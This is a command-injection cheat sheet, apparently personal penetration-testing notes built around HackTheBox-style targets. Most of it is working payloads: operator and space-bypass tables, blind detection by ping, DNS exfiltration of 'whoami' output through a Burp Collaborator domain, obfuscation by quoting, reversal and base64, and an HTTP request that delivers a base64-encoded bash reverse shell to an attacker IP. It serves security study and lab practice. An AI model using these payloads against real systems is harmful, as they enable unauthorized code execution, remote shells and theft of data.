# Cmd Injection

## Where Would You Find Command Injection

* In the following places:
* Text boxes that take in input
* Hidden URLs that take input
* E.g. `/execute/command-name`
* Or through queries e.g. `/location?parameter=command`
* When using URLs, remember to URL encode the characters that aren’t accepted
* Hidden ports:
* Some frameworks open debug ports that take in arbitrary commands

### Overview

* Use command line symbols within the input to alter the executed command
* Pay close attention to functions within an application that tend to be performed by an OS command
* Two forms exist, blind command injection --> you do not see the returned output, and non-blind cmd injection --> the system command output gets returned back to you
* Ensure you use the proper system commands per the OS

```
cat vs type 
ping -c vs ping -n #ping -n causes an infinte ping loop in linux
ls vs dir
```

* Try to start with reading a world readable file&#x20;

<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

## Injection Operators Table

| Operator | URL-Encoded | Executed |
|----------|-------------|----------|
| `;` | `%3b` | Both |
| `\n` (newline) | `%0a` | Both |
| `&` | `%26` | Both (2nd shown first) |
| `\|` (pipe) | `%7c` | Both (only 2nd output) |
| `&&` | `%26%26` | Both (only if 1st succeeds) |
| `\|\|` | `%7c%7c` | 2nd (only if 1st fails) |
| `` ` `` (backtick) | `%60%60` | Both (Linux only) |
| `$()` | `%24%28%29` | Both (Linux only) |
| `#` | `%23` | Truncates (Linux only) |

**Note:** `;` doesn't work in Windows CMD, but works in PowerShell.

---

## Using # (Hash) to Truncate Commands

In bash, `#` starts a comment, which means anything after it on the same line is ignored. This is extremely useful in command injection when your injected payload is concatenated with additional characters that would break your command.

**Example scenario:** The backend command is:
```bash
/bin/bash -c 'ssh username@hostname'
```

If you inject into `username`, the `@hostname` part would break your payload. Using `#` truncates the rest:

```bash
# Injection payload
;ping${IFS}-c4${IFS}10.10.14.157;#

# Results in:
/bin/bash -c 'ssh ;ping -c4 10.10.14.157;#@hostname'
# The @hostname is now a comment and ignored!
```

**Real-world example:**

```http
POST /executessh HTTP/1.1
Host: target.htb
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=ABC123

host=localhost&username=;ping${IFS}-c4${IFS}10.10.14.157;#
```

The `#` prevents the rest of the backend command from being interpreted, allowing your payload to execute cleanly.

---

## Non-Blind CMD Inj.

* At the most basic level:
* Use command line symbols within the input to alter the executed command
* Once you have identified a potential injection point, use command line symbols within the input to alter the executed command&#x20;

```
; | || & && > >>
```

<figure><img src="../.gitbook/assets/image (2) (1) (4).png" alt=""><figcaption></figcaption></figure>

* Once you have exploited non-blind cmd injection, escalate to a reverse shell.

### Blind CMD Injection

#### Identification

* ICMP and DNS are useful to determine blind cmd injection&#x20;

```
google.com; ping -c11 127.0.0.1 #server will hang for roughly 10 seconds
```

* Can also try to ping yourself, however many corporate environments have firewalls in place to stop this, so doesn't always mean blind cmd injection isn't taking place&#x20;
* Use `tcpdump` to capture the `icmp` echo requests.

<figure><img src="../.gitbook/assets/image (3) (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

* This proves blind cmd injection, escalate to reverse shell

### Burp Collaborator

* Launch Burp, and choose:

![](<../.gitbook/assets/image (1) (2) (1).png>)

```
Burp --> Burp Collaborator Client
Press --> "Copy to Clipboard" #to copy a randomly generated domain name
Execute your cmd injection
```

* Press `Poll Now` to see if the request came through&#x20;

<figure><img src="../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>

* If the above worked, move down to Data Exfil section

### **Data Exfil via DNS and Burp Collaborator**&#x20;

* Once you have your Burp Collaborator Domain, try your command injection&#x20;

```
google.com; a=$(whoami|base32|tr -d =); nslookup $a.COLLAB_DOMAIN_NAME.com
```

* Press Poll now and you should have something returned like this:

```
O53XOLLEMF2GCCQ.323lijijf90304jklksjru43k23.oastify.com
```

* Then type the following in your local terminal&#x20;

```
echo -n O53XOLLEMF2GCCQ | wc -c
```

* If this fails as `Invalid Base32` add 1, or 2 equal signs at the end for padding

```
echo -n O53XOLLEMF2GCCQ= | base32 -d
#output:
www-data
```

### Bypassing Character Blocklist with ffuf

* If you see that some special characters are banned, create a burp request to the resource you want to test
* It should be a post request
* Identify the parameter that it is using to post the data to the server&#x20;

```
name=;ls
```

* Swap out the command injection attempt that is getting blocked in the burp request with:

```
name=FUZZ
```

* Save the burp request to your local machine in a file&#x20;

```
ffuf -request search.request --request-proto http -w /opt/Seclists/Fuzzing/special-chars.txt
```

* You usually will have to ignore the `&` character as many webservers will think you are going to pass in another parameter
* Now that you have your results back you must filter out the most common side that you see being returned&#x20;
* `-fs 724`
* Can comma seperate filter size i.e. you see alot of 724 and 726 returned saying that character you posted is blocked&#x20;
* `-fs 724,726`
* Ensure you also `-mc all` or match code to see all the different http status codes returned, look for 5XX errors&#x20;
* If you see errors on:

```
{ == SSTI
; | & == cmd injection
' " == SQLI
```

### IFS Bypass No Spaces CmdInjection

* whitespace bypass&#x20;

```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin?error=Username%20can%27t%20contain%20whitespaces!
Cookie: JSESSIONID=DB9090F5B00F1D06EBACD0FEB329530C
Upgrade-Insecure-Requests: 1

host=cozyhosting&username=;ping${IFS}-c4${IFS}10.10.14.157;#
```

* can see above that the username (our injection point) cannot contain spaces, we can use `{IFS}`to bypass this restriction and get cmd injection
* Gaining a reverse shell, encode your payload and have it decode and execute to avoid special character issues&#x20;

```
echo "bash -i >& /dev/tcp/10.10.14.157/1234 0>&1" | base64 -w 0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTcvMTIzNCAwPiYxCg==
// use this 
;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTcvMTIzNCAwPiYxCg=="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```

---

## Space Bypass Techniques

| Technique | Example | OS |
|-----------|---------|-----|
| Tab | `%09` | Both |
| `${IFS}` | `cat${IFS}/etc/passwd` | Linux |
| `$IFS$9` | `cat$IFS$9/etc/passwd` | Linux |
| Brace Expansion | `{cat,/etc/passwd}` | Linux |
| `<` redirect | `cat</etc/passwd` | Linux |

---

## Slash (/) Bypass

### Linux - Using Environment Variables

```bash
# Get / from $PATH
echo ${PATH:0:1}
# Output: /

# Full command
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

### Windows CMD

```cmd
# Get \ from %HOMEPATH%
echo %HOMEPATH:~6,-11%
```

### Windows PowerShell

```powershell
$env:HOMEPATH[0]
$env:PROGRAMFILES[10]
```

---

## Semicolon (;) Bypass

```bash
# From LS_COLORS env var
echo ${LS_COLORS:10:1}
# Output: ;
```

---

## Character Shifting (Linux)

```bash
# Get \ (ASCII 92) by shifting [ (ASCII 91)
echo $(tr '!-}' '"-~'<<<[)
```

---

## Command Obfuscation

### Quote Insertion (Linux & Windows)

```bash
w'h'o'am'i
w"h"o"am"i
```

### Linux-Only Characters

```bash
who$@ami
w\ho\am\i
```

### Windows Caret

```cmd
who^ami
```

---

## Case Manipulation

### Windows (case insensitive)

```cmd
WhOaMi
WHOAMI
```

### Linux (needs tr)

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

---

## Reversed Commands

### Linux

```bash
# Reverse string
echo 'whoami' | rev
# Output: imaohw

# Execute reversed
$(rev<<<'imaohw')
```

### Windows PowerShell

```powershell
# Reverse
"whoami"[-1..-20] -join ''

# Execute
iex "$('imaohw'[-1..-20] -join '')"
```

---

## Base64 Encoded Commands

### Linux

```bash
# Encode
echo -n 'cat /etc/passwd' | base64

# Execute (avoid pipe with <<<)
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
```

### Windows PowerShell

```powershell
# Encode
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

# Execute
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

### Encode for PowerShell from Linux

```bash
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

---

## Obfuscation Tools

### Bashfuscator (Linux)

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user

# Basic usage
./bashfuscator/bin/bashfuscator -c 'cat /etc/passwd'

# Shorter output
./bashfuscator/bin/bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

### DOSfuscation (Windows)

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation

# Inside tool:
SET COMMAND type C:\flag.txt
encoding
1
```

---

## Newline Bypass

Often not blacklisted - use `%0a`:

```
127.0.0.1%0awhoami
```

---

## Example Challenge Payload

```http
GET /index.php?to=tmp&from=file.txt%09`$(rev<<<'tac')%09${PATH:0:1}flag.txt`&finish=1&move=1 HTTP/1.1
```

Breakdown:
- `%09` = tab (space bypass)
- `$(rev<<<'tac')` = reversed `cat` command
- `${PATH:0:1}` = `/` character
